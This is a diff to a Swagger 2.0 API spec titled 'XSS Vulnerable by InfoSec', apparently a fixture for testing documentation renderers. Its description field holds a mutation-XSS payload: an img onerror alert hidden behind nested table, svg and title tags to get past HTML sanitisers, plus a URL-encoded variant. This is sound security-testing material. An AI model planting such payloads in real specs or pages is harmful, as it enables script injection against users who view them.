@@ -1,7 +1,7 @@
 swagger: '2.0'
 info:
   title: XSS Vulnerable by InfoSec
-  description: '<img src onerror-"alert(2025)"><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><table><caption><svg><desc></table></desc><title><a title="</title><img src onerror="alert(2025)">">'
+  description: '<img src onerror-"alert(2025)"><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><r><table><caption><svg><desc></table></desc><title><a title="</title><img src onerror=alert(2025)><img%20src%20onerror=alert(1)>">'
 paths:
   /accounts:
     get:
